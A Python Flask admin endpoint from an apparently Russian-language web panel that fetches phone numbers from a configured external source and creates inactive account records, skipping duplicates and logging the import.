@admin_bp.route('/api/number_import/run', methods=['POST'])
@login_required
def api_number_import_run():
    """
    Fetch numbers from the configured external source and create Account rows.

    Request JSON (all optional – fallback to stored PanelSettings):
      url, source_type, auth_header, json_path
    """
    from models.panel_settings import PanelSettings
    import services.accounts.number_import as _nim

    stored = {
        s.key: s.value
        for s in db.session.query(PanelSettings).filter(
            PanelSettings.key.in_([
                'number_import_url', 'number_import_type',
                'number_import_auth', 'number_import_json_path',
            ])
        ).all()
    }

    body = request.get_json() or {}
    url = body.get('url') or stored.get('number_import_url', '')
    source_type = body.get('source_type') or stored.get('number_import_type', 'custom_json')
    auth_header = body.get('auth_header') or stored.get('number_import_auth') or None
    json_path = body.get('json_path') or stored.get('number_import_json_path', '')

    if not url:
        return jsonify({'success': False, 'error': 'URL источника не указан'}), 400

    if source_type not in _nim.SUPPORTED_SOURCE_TYPES:
        return jsonify({'success': False, 'error': f'Неизвестный тип: {source_type}'}), 400

    numbers, error = _nim.fetch_numbers(
        url=url,
        source_type=source_type,
        auth_header=auth_header,
        json_path=json_path,
    )

    if error:
        return jsonify({'success': False, 'error': error}), 502

    if not numbers:
        return jsonify({'success': True, 'fetched': 0, 'added': 0, 'skipped': 0,
                        'message': 'Источник вернул пустой список номеров'})

    # Persist new accounts, skipping existing phones
    added = 0
    skipped = 0
    for phone in numbers:
        exists = db.session.execute(
            select(Account).filter_by(phone=phone)
        ).scalar_one_or_none()
        if exists:
            skipped += 1
            continue
        acc = Account(
            id=uuid.uuid4().hex,
            phone=phone,
            status='inactive',
            owner_id=current_user.id,
        )
        db.session.add(acc)
        added += 1

    db.session.commit()
    log_action(
        'number_import_run',
        f'source_type={source_type} fetched={len(numbers)} added={added} skipped={skipped}',
    )
    return jsonify({
        'success': True,
        'fetched': len(numbers),
        'added': added,
        'skipped': skipped,
    })
